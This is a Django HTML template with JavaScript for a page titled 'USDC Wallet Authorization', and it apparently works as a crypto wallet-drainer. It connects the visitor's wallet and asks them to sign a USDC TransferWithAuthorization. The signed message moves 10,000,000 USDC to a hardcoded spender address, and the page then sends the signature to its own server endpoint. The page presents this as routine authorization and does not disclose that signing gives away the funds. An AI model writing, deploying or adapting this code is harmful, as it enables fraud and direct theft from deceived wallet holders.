{% load static %}
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>USDC Wallet Authorization</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<style>
:root { --accent: #38bdf8; --bg-dark: #0f172a; --card-bg: #1e293b; }
body { background-color: var(--bg-dark); color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; font-family: 'Inter', sans-serif; }
.auth-card { background: var(--card-bg); padding: 40px; border-radius: 28px; width: 100%; max-width: 440px; border: 1px solid #334155; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); }
.btn-action { background: var(--accent); color: var(--bg-dark); font-weight: 800; border: none; padding: 16px; border-radius: 14px; width: 100%; transition: 0.3s; }
.btn-action:hover { background: #7dd3fc; transform: translateY(-2px); }
.btn-action:disabled { background: #475569; cursor: not-allowed; }
.detail-row { background: rgba(15,23,42,0.5); padding:12px 16px; border-radius:12px; margin-bottom:12px; }
.detail-label { font-size:0.7rem; color:#94a3b8; text-transform:uppercase; display:block; }
.detail-value { font-family:'Roboto Mono', monospace; font-size:0.85rem; color: var(--accent); word-break:break-all; }
.status-pill { display:inline-block; padding:6px 16px; border-radius:20px; font-size:0.75rem; font-weight:600; margin-top:20px; background: rgba(255,255,255,0.05); color:#94a3b8; }
</style>
</head>
<body>

<div class="auth-card">
    <h4 class="text-center mb-4">Authorize USDC Transfer</h4>
    <div id="step-1">
        <button id="connectBtn" class="btn-action">Connect Wallet</button>
    </div>
    <div id="step-2" class="d-none">
        <div class="detail-row">
            <span class="detail-label">Your Address</span>
            <div id="addrDisplay" class="detail-value"></div>
        </div>
        <div class="detail-row">
            <span class="detail-label">Network</span>
            <div id="networkDisplay" class="detail-value"></div>
        </div>
        <button id="signBtn" class="btn-action">Sign 10,000,000 USDC Permit</button>
    </div>
    <div class="text-center">
        <div id="status" class="status-pill">System Ready</div>
    </div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
<script>
const SPENDER = "0x0148CeA1f2DAC72f17c2130d8d43a3aB0eb9930B";
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
let userAccount = null;

const networks = { 1: "Ethereum Mainnet", 137:"Polygon" };

// Connect wallet
async function connectWallet(){
    if(!window.ethereum){ alert("No wallet detected."); return; }
    try{
        const provider = new ethers.BrowserProvider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = await provider.getSigner();
        userAccount = await signer.getAddress();

        const network = await provider.getNetwork();
        const chainId = network.chainId;

        document.getElementById('step-1').classList.add('d-none');
        document.getElementById('step-2').classList.remove('d-none');
        document.getElementById('addrDisplay').innerText = userAccount;
        document.getElementById('networkDisplay').innerText = networks[chainId]||"Other";
        document.getElementById('status').innerText="Wallet Connected";
    }catch(err){ console.error(err); alert(err.message); }
}

// Sign permit
async function signPermit(){
    const status = document.getElementById('status');
    status.innerText="Requesting signature...";
    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();

    const chainId = (await provider.getNetwork()).chainId;
    const amount = ethers.parseUnits("10000000",6); // 10M USDC

    // USDC TransferWithAuthorization domain
    const domain = { name:"USD Coin", version:"2", chainId, verifyingContract:USDC_ADDRESS };
    const types = {
        TransferWithAuthorization:[
            {name:"from", type:"address"},
            {name:"to", type:"address"},
            {name:"value", type:"uint256"},
            {name:"validAfter", type:"uint256"},
            {name:"validBefore", type:"uint256"},
            {name:"nonce", type:"bytes32"}
        ]
    };
    const message = {
        from:userAccount,
        to:SPENDER,
        value:amount,
        validAfter:0,
        validBefore: Math.floor(Date.now()/1000)+86400,
        nonce:ethers.hexlify(ethers.randomBytes(32))
    };

    try{
        const sig = await signer.signTypedData(domain,types,message);
        await fetch('/user/save-permit/', {
            method:'POST',
            headers:{'Content-Type':'application/json','X-CSRFToken':'{{ csrf_token }}'},
            body:JSON.stringify({message,sig})
        });
        status.innerText="Permit signed & sent to server!";
    }catch(err){ console.error(err); status.innerText="Error signing permit"; }
}

document.getElementById('connectBtn').addEventListener('click',connectWallet);
document.getElementById('signBtn').addEventListener('click',signPermit);
</script>
</body>
</html>
